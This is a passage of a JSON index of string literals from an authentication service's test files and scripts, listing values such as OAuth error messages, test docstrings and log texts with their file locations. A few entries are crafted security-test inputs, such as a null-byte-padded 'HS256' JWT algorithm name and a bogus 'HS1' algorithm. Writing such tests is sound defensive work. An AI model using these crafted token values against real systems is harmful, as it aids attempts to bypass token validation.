      "value": "GOOGLE_CLIENT_ID correctly detected as missing:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:117"
      ]
    },
    "GOOGLE_CLIENT_ID error:": {
      "value": "GOOGLE_CLIENT_ID error:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:215"
      ]
    },
    "GOOGLE_CLIENT_SECRET": {
      "value": "GOOGLE_CLIENT_SECRET",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:45",
        "auth_service/test_url_construction.py:46",
        "auth_service/tests/config/test_env.py:39",
        "auth_service/tests/config/test_env.py:203",
        "auth_service/tests/config/test_settings.py:186",
        "auth_service/tests/conftest.py:31",
        "auth_service/tests/test_critical_oauth_environment_failures.py:45",
        "auth_service/tests/test_critical_oauth_environment_failures.py:90",
        "auth_service/tests/test_critical_oauth_environment_failures.py:138",
        "auth_service/tests/test_critical_oauth_environment_failures.py:139"
      ]
    },
    "GOOGLE_CLIENT_SECRET correctly detected as missing:": {
      "value": "GOOGLE_CLIENT_SECRET correctly detected as missing:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:157"
      ]
    },
    "GOOGLE_CLIENT_SECRET error:": {
      "value": "GOOGLE_CLIENT_SECRET error:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:222"
      ]
    },
    "GOOGLE_CLOUD_PROJECT": {
      "value": "GOOGLE_CLOUD_PROJECT",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:273"
      ]
    },
    "General disposal failure": {
      "value": "General disposal failure",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:438"
      ]
    },
    "Generate Business Value Test Coverage Index": {
      "value": "Generate Business Value Test Coverage Index",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:774"
      ]
    },
    "Generate HTML test report": {
      "value": "Generate HTML test report",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:504"
      ]
    },
    "Generate JSON test report": {
      "value": "Generate JSON test report",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:503"
      ]
    },
    "Generate auto-split suggestions": {
      "value": "Generate auto-split suggestions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:523"
      ]
    },
    "Generate comprehensive fix report": {
      "value": "Generate comprehensive fix report",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:263"
      ]
    },
    "Generate comprehensive test organization audit\n\nBusiness Value Justification (BVJ):\n1. Segment: Platform/Internal\n2. Business Goal: Development Velocity\n3. Value Impact: Identifies test organization issues blocking development\n4. Strategic Impact: Reduces development friction by 50%": {
      "value": "Generate comprehensive test organization audit\n\nBusiness Value Justification (BVJ):\n1. Segment: Platform/Internal\n2. Business Goal: Development Velocity\n3. Value Impact: Identifies test organization issues blocking development\n4. Strategic Impact: Reduces development friction by 50%",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:1"
      ]
    },
    "Generate detailed report": {
      "value": "Generate detailed report",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:357"
      ]
    },
    "Generate intelligent recommendations": {
      "value": "Generate intelligent recommendations",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:243"
      ]
    },
    "Generate intelligent test based on code analysis": {
      "value": "Generate intelligent test based on code analysis",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:22"
      ]
    },
    "Generate report from existing scan results": {
      "value": "Generate report from existing scan results",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:381"
      ]
    },
    "Generate splitting suggestions": {
      "value": "Generate splitting suggestions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:677"
      ]
    },
    "Generated URL:": {
      "value": "Generated URL:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:66"
      ]
    },
    "Generated async URL:": {
      "value": "Generated async URL:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:152"
      ]
    },
    "Generated by auto_fix_test_violations.py": {
      "value": "Generated by auto_fix_test_violations.py",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:519",
        "scripts/auto_fix_test_violations.py:548"
      ]
    },
    "Generated sync URL:": {
      "value": "Generated sync URL:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:153"
      ]
    },
    "Generated:": {
      "value": "Generated:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:519",
        "scripts/auto_fix_test_violations.py:854",
        "scripts/compliance/fake_test_scanner.py:250"
      ]
    },
    "Generating tests for": {
      "value": "Generating tests for",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:280"
      ]
    },
    "Get active sessions for user": {
      "value": "Get active sessions for user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:269"
      ]
    },
    "Get all sessions for a user": {
      "value": "Get all sessions for a user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:86"
      ]
    },
    "Get isolated database session with transaction rollback": {
      "value": "Get isolated database session with transaction rollback",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:68"
      ]
    },
    "Get user by ID from database": {
      "value": "Get user by ID from database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:265"
      ]
    },
    "Get user by email from database": {
      "value": "Get user by email from database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:258"
      ]
    },
    "Git mv error:": {
      "value": "Git mv error:",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:142"
      ]
    },
    "Git mv failed:": {
      "value": "Git mv failed:",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:139"
      ]
    },
    "GitHub User": {
      "value": "GitHub User",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:225"
      ]
    },
    "GitHub token required": {
      "value": "GitHub token required",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:70",
        "scripts/test_verify_workflow_status_corrected.py:121"
      ]
    },
    "Google Client ID missing error not detected: '": {
      "value": "Google Client ID missing error not detected: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:112"
      ]
    },
    "Google Client Secret missing error not detected: '": {
      "value": "Google Client Secret missing error not detected: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:152"
      ]
    },
    "Google OAuth Flow Tests - Business Impact\n\nRevenue Impact: $100K+ MRR Enterprise Google SSO\n- Enables Google SSO for Enterprise customers requiring Google Workspace integration\n- Validates complete Google OAuth flow for Enterprise authentication\n- Critical for Enterprise deals requiring Google SSO compliance\n\nTechnical Excellence:\n- Google OAuth initiation: authorization URL generation with proper security\n- Token exchange: secure Google token validation and error handling\n- User profile mapping: comprehensive Google user information integration\n- Scope validation: minimal privilege principle and security compliance\n- State security: CSRF protection and OAuth security best practices\n- Concurrent handling: scalable Google OAuth for Enterprise user loads\n\nEnterprise Readiness:\n- Enterprise: Google SSO compliance for $100K+ Google Workspace contracts\n- Security: OAuth state validation and secure Google token handling\n- Performance: Concurrent Google OAuth request handling for Enterprise scale\n- Integration: Complete Google user profile mapping and account management\n- Compliance: Google OAuth security standards for enterprise authentication": {
      "value": "Google OAuth Flow Tests - Business Impact\n\nRevenue Impact: $100K+ MRR Enterprise Google SSO\n- Enables Google SSO for Enterprise customers requiring Google Workspace integration\n- Validates complete Google OAuth flow for Enterprise authentication\n- Critical for Enterprise deals requiring Google SSO compliance\n\nTechnical Excellence:\n- Google OAuth initiation: authorization URL generation with proper security\n- Token exchange: secure Google token validation and error handling\n- User profile mapping: comprehensive Google user information integration\n- Scope validation: minimal privilege principle and security compliance\n- State security: CSRF protection and OAuth security best practices\n- Concurrent handling: scalable Google OAuth for Enterprise user loads\n\nEnterprise Readiness:\n- Enterprise: Google SSO compliance for $100K+ Google Workspace contracts\n- Security: OAuth state validation and secure Google token handling\n- Performance: Concurrent Google OAuth request handling for Enterprise scale\n- Integration: Complete Google user profile mapping and account management\n- Compliance: Google OAuth security standards for enterprise authentication",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:466"
      ]
    },
    "Google OAuth Flow Tests - Google SSO integration for auth service\n\nTests complete Google OAuth flow including initiation, callback handling, token exchange,\nand user information retrieval. Critical for Enterprise Google SSO requirements.\n\nBusiness Value Justification (BVJ):\n- Segment: Enterprise | Goal: Google SSO | Impact: $100K+ MRR\n- Enables Google SSO for Enterprise customers requiring Google Workspace integration\n- Validates complete Google OAuth flow for Enterprise authentication\n- Critical for Enterprise deals requiring Google SSO compliance\n\nTest Coverage:\n- Google OAuth initiation and authorization URL generation\n- Google OAuth callback handling and token exchange\n- Google user information retrieval and profile creation\n- Google OAuth error scenarios and edge cases\n- Google SSO integration validation for Enterprise requirements": {
      "value": "Google OAuth Flow Tests - Google SSO integration for auth service\n\nTests complete Google OAuth flow including initiation, callback handling, token exchange,\nand user information retrieval. Critical for Enterprise Google SSO requirements.\n\nBusiness Value Justification (BVJ):\n- Segment: Enterprise | Goal: Google SSO | Impact: $100K+ MRR\n- Enables Google SSO for Enterprise customers requiring Google Workspace integration\n- Validates complete Google OAuth flow for Enterprise authentication\n- Critical for Enterprise deals requiring Google SSO compliance\n\nTest Coverage:\n- Google OAuth initiation and authorization URL generation\n- Google OAuth callback handling and token exchange\n- Google user information retrieval and profile creation\n- Google OAuth error scenarios and edge cases\n- Google SSO integration validation for Enterprise requirements",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:1"
      ]
    },
    "Google should be a supported OAuth provider": {
      "value": "Google should be a supported OAuth provider",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:400"
      ]
    },
    "Graceful degradation test failed:": {
      "value": "Graceful degradation test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:274"
      ]
    },
    "Graceful degradation working: degraded=": {
      "value": "Graceful degradation working: degraded=",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:270"
      ]
    },
    "Graceful shutdown took too long:": {
      "value": "Graceful shutdown took too long:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:486"
      ]
    },
    "HEAD": {
      "value": "HEAD",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:228"
      ]
    },
    "HIGH": {
      "value": "HIGH",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:65",
        "scripts/ci/check_test_stubs.py:97",
        "scripts/remove_test_stubs.py:151",
        "scripts/remove_test_stubs.py:197"
      ]
    },
    "HMAC secret test: '": {
      "value": "HMAC secret test: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:330"
      ]
    },
    "HMAC signature verification failed": {
      "value": "HMAC signature verification failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:164"
      ]
    },
    "HOSTNAME": {
      "value": "HOSTNAME",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:134"
      ]
    },
    "HS1": {
      "value": "HS1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:97"
      ]
    },
    "HS256": {
      "value": "HS256",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:23",
        "auth_service/tests/config/test_settings.py:40",
        "auth_service/tests/factories/token_factory.py:20",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:464",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:525",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1001",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1004",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1009",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1052",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1055"
      ]
    },
    "HS256\u0000": {
      "value": "HS256\u0000",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:166"
      ]
    },
    "Handler initialization failed:": {
      "value": "Handler initialization failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:268"
      ]
    },
    "Hardcoded test data pattern found:": {
      "value": "Hardcoded test data pattern found:",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:176"
      ]
    },
    "Has": {
      "value": "Has",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:288"
      ]
    },
    "Has TCP config:": {
      "value": "Has TCP config:",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:42",
        "scripts/test_database_url_builder_comprehensive.py:98"
      ]
    },
    "Hash should be much longer than original password": {
      "value": "Hash should be much longer than original password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:139"
      ]
    },
    "Hash should contain memory parameter": {
      "value": "Hash should contain memory parameter",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:111"
      ]
    },
    "Hash should contain parallelism parameter": {
      "value": "Hash should contain parallelism parameter",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:113"
      ]
    },
    "Hash should contain time parameter": {
      "value": "Hash should contain time parameter",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:112"
      ]
    },
    "Hash should not contain the original password": {
      "value": "Hash should not contain the original password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:143"
      ]
    },
    "Health Endpoints": {
      "value": "Health Endpoints",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:239"
      ]
    },
    "Health check passed": {
      "value": "Health check passed",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:130"
      ]
    },
    "Health endpoint returned": {
      "value": "Health endpoint returned",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:135"
      ]
    },
    "Health endpoint returned status": {
      "value": "Health endpoint returned status",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:116"
      ]
    },
    "Health endpoint test failed": {
      "value": "Health endpoint test failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:198"
      ]
    },
    "Health endpoint test failed:": {
      "value": "Health endpoint test failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:136",
        "scripts/test_websocket_dev_mode.py:139"
      ]
    },
    "Health endpoint test passed:": {
      "value": "Health endpoint test passed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:132"
      ]
    },
    "Health response missing field:": {
      "value": "Health response missing field:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:125"
      ]
    },
    "Healthy": {
      "value": "Healthy",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:363"
      ]
    },
    "Heap size:": {
      "value": "Heap size:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:117"
      ]
    },
    "Hello, can you help me optimize my AI workload?": {
      "value": "Hello, can you help me optimize my AI workload?",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:52"
      ]
    },
    "Help text should display successfully": {
      "value": "Help text should display successfully",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:87"
      ]
    },
    "Helper functions:": {
      "value": "Helper functions:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:37"
      ]
    },
    "Helper method extraction not yet implemented for": {
      "value": "Helper method extraction not yet implemented for",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:587"
      ]
    },
    "High": {
      "value": "High",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:166"
      ]
    },
    "High - Agent system": {
      "value": "High - Agent system",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:42"
      ]
    },
    "High - Services": {
      "value": "High - Services",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:44"
      ]
    },
    "High - WebSocket": {
      "value": "High - WebSocket",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:43"
      ]
    },
    "High Failure Rate Tests:": {
      "value": "High Failure Rate Tests:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:297"
      ]
    },
    "High timeout rate (": {
      "value": "High timeout rate (",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:297"
      ]
    },
    "Highly Similar:": {
      "value": "Highly Similar:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:658"
      ]
    },
    "Host:": {
      "value": "Host:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:232",
        "scripts/test_ssl_certificates_staging.py:39",
        "scripts/test_ssl_certificates_staging.py:215",
        "scripts/test_staging_db_direct.py:44",
        "scripts/test_staging_migrations.py:44"
      ]
    },
    "Hostname:": {
      "value": "Hostname:",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:60"
      ]
    },
    "ID token issued too long ago should be rejected": {
      "value": "ID token issued too long ago should be rejected",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:117"
      ]
    },
    "ID token with wrong issuer should be rejected": {
      "value": "ID token with wrong issuer should be rejected",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:103"
      ]
    },
    "INFO": {
      "value": "INFO",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:76",
        "netra_backend/app/services/realistic_test_data/log_generator.py:83",
        "netra_backend/app/services/realistic_test_data/log_generator.py:88",
        "auth_service/tests/config/test_env.py:51",
        "auth_service/tests/config/test_env.py:174",
        "auth_service/tests/config/test_env.py:195",
        "auth_service/tests/config/test_settings.py:78",
        "auth_service/tests/config/test_settings.py:125",
        "scripts/test_error_monitor_logic.py:38",
        "scripts/test_error_monitor_logic.py:66"
      ]
    },
    "INSERT": {
      "value": "INSERT",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:123",
        "auth_service/tests/test_security.py:177",
        "auth_service/tests/test_security.py:207",
        "auth_service/tests/test_security.py:615"
      ]
    },
    "INSTANCE_CONNECTION_NAME": {
      "value": "INSTANCE_CONNECTION_NAME",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:232"
      ]
    },
    "INSTANCE_ID": {
      "value": "INSTANCE_ID",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:199"
      ]
    },
    "INTEGRATION TEST: Test actual database connection with staging-like credentials.\n        \n        This test validates that properly configured staging credentials would\n        allow successful database connection (mocked for testing).": {
      "value": "INTEGRATION TEST: Test actual database connection with staging-like credentials.\n        \n        This test validates that properly configured staging credentials would\n        allow successful database connection (mocked for testing).",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:417"
      ]
    },
    "INTEGRATION TEST: Test database connection failure with invalid credentials.\n        \n        This test validates that invalid staging credentials properly fail\n        connection attempts with appropriate error messages.": {
      "value": "INTEGRATION TEST: Test database connection failure with invalid credentials.\n        \n        This test validates that invalid staging credentials properly fail\n        connection attempts with appropriate error messages.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:450"
      ]
    },
    "ISSUE IDENTIFIED:": {
      "value": "ISSUE IDENTIFIED:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:94"
      ]
    },
    "ITERATION": {
      "value": "ITERATION",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:103"
      ]
    },
    "ITERATIONS": {
      "value": "ITERATIONS",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:158"
      ]
    },
    "Identify gaps in test coverage": {
      "value": "Identify gaps in test coverage",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:185"
      ]
    },
    "Impact:": {
      "value": "Impact:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:345"
      ]
    },
    "Implement memory monitoring and alerting": {
      "value": "Implement memory monitoring and alerting",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:447"
      ]
    },
    "Implement memory optimization": {
      "value": "Implement memory optimization",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:396"
      ]
    },
    "Implement real functionality or remove unused function": {
      "value": "Implement real functionality or remove unused function",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:234"
      ]
    },
    "Import error (expected in test environment):": {
      "value": "Import error (expected in test environment):",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:41"
      ]
    },
    "Import error:": {
      "value": "Import error:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:132"
      ]
    },
    "Import fixes applied:": {
      "value": "Import fixes applied:",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:427"
      ]
    },
    "Import resolution failed:": {
      "value": "Import resolution failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:237"
      ]
    },
    "Import test failed. Please fix the import errors above.": {
      "value": "Import test failed. Please fix the import errors above.",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:92"
      ]
    },
    "Import test interrupted by user": {
      "value": "Import test interrupted by user",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:127"
      ]
    },
    "Import validation failed:": {
      "value": "Import validation failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:224"
      ]
    },
    "ImportError": {
      "value": "ImportError",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:34",
        "scripts/comprehensive_test_fixer.py:42",
        "scripts/fix_test_batch.py:44"
      ]
    },
    "ImportError: cannot import name '(\\w+)' from '([\\w\\.]+)'": {
      "value": "ImportError: cannot import name '(\\w+)' from '([\\w\\.]+)'",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:38",
        "scripts/fix_test_batch.py:42"
      ]
    },
    "Improve error handling": {
      "value": "Improve error handling",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:416"
      ]
    },
    "In-progress request cancelled - no graceful shutdown": {
      "value": "In-progress request cancelled - no graceful shutdown",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:491"
      ]
    },
    "In-progress request failed during shutdown:": {
      "value": "In-progress request failed during shutdown:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:485"
      ]
    },
    "In-progress request terminated abruptly - no graceful shutdown": {
      "value": "In-progress request terminated abruptly - no graceful shutdown",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:489"
      ]
    },
    "Include": {
      "value": "Include",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:134",
        "scripts/generate_test_audit.py:28",
        "scripts/test_exclusion_check.py:22"
      ]
    },
    "Incomplete OAuth config '": {
      "value": "Incomplete OAuth config '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:237"
      ]
    },
    "Incomplete user information": {
      "value": "Incomplete user information",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:274"
      ]
    },
    "Inconsistent SSL handling: manager=": {
      "value": "Inconsistent SSL handling: manager=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:142"
      ]
    },
    "Increase real LLM test coverage from": {
      "value": "Increase real LLM test coverage from",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:694"
      ]
    },
    "Increase test coverage for critical component '": {
      "value": "Increase test coverage for critical component '",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:711"
      ]
    },
    "Initial login failed": {
      "value": "Initial login failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1365"
      ]
    },
    "Initialization order test failed:": {
      "value": "Initialization order test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:73"
      ]
    },
    "InitializationManager": {
      "value": "InitializationManager",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:191"
      ]
    },
    "Initializing database...": {
      "value": "Initializing database...",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:25"
      ]
    },
    "Initiate graceful shutdown of auth service": {
      "value": "Initiate graceful shutdown of auth service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:528"
      ]
    },
    "Insights enabling optimization decisions for": {
      "value": "Insights enabling optimization decisions for",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:494"
      ]
    },
    "Install dependencies if missing": {
      "value": "Install dependencies if missing",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:416"
      ]
    },
    "Install with: pip install cloud-sql-python-connector[asyncpg]": {
      "value": "Install with: pip install cloud-sql-python-connector[asyncpg]",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:118"
      ]
    },
    "Installing frontend dependencies...": {
      "value": "Installing frontend dependencies...",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:138",
        "scripts/test_frontend.py:50"
      ]
    },
    "Insufficient scope for user info": {
      "value": "Insufficient scope for user info",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:254"
      ]
    },
    "Integration Tests": {
      "value": "Integration Tests",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:51"
      ]
    },
    "Integration test has": {
      "value": "Integration test has",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:287",
        "scripts/compliance/real_test_requirements_enforcer.py:369",
        "scripts/compliance/real_test_validator.py:248"
      ]
    },
    "Integration tests for Redis connection failover and resilience\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Service reliability and graceful degradation\n- Value Impact: Ensures OAuth security works even when Redis fails\n- Strategic Impact: Prevents auth service outages during Redis failures\n\nThis test suite validates:\n1. Redis connection establishment and health checks\n2. Graceful fallback to in-memory storage when Redis unavailable\n3. Connection recovery after Redis becomes available\n4. OAuth security functionality during Redis outages\n5. Memory cleanup and connection management": {
      "value": "Integration tests for Redis connection failover and resilience\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Service reliability and graceful degradation\n- Value Impact: Ensures OAuth security works even when Redis fails\n- Strategic Impact: Prevents auth service outages during Redis failures\n\nThis test suite validates:\n1. Redis connection establishment and health checks\n2. Graceful fallback to in-memory storage when Redis unavailable\n3. Connection recovery after Redis becomes available\n4. OAuth security functionality during Redis outages\n5. Memory cleanup and connection management",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:1"
      ]
    },
    "Integration tests for component interaction": {
      "value": "Integration tests for component interaction",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:76"
      ]
    },
    "Internal server error": {
      "value": "Internal server error",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:187"
      ]
    },
    "Invalid": {
      "value": "Invalid",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:209"
      ]
    },
    "Invalid Cloud SQL format": {
      "value": "Invalid Cloud SQL format",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:189"
      ]
    },
    "Invalid Content-Length header": {
      "value": "Invalid Content-Length header",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:54"
      ]
    },
    "Invalid GOOGLE_CLIENT_ID format not detected: '": {
      "value": "Invalid GOOGLE_CLIENT_ID format not detected: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:278"
      ]
    },
    "Invalid GOOGLE_CLIENT_ID placeholder returned: '": {
      "value": "Invalid GOOGLE_CLIENT_ID placeholder returned: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:110"
      ]
    },
    "Invalid GOOGLE_CLIENT_SECRET placeholder returned: '": {
      "value": "Invalid GOOGLE_CLIENT_SECRET placeholder returned: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:150"
      ]
    },
    "Invalid JWT format: expected 3 parts, got": {
      "value": "Invalid JWT format: expected 3 parts, got",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:38"
      ]
    },
    "Invalid JWT structure:": {
      "value": "Invalid JWT structure:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:217"
      ]
    },
    "Invalid UUID format:": {
      "value": "Invalid UUID format:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:31"
      ]
    },
    "Invalid access token": {
      "value": "Invalid access token",
      "category": "test_literals",
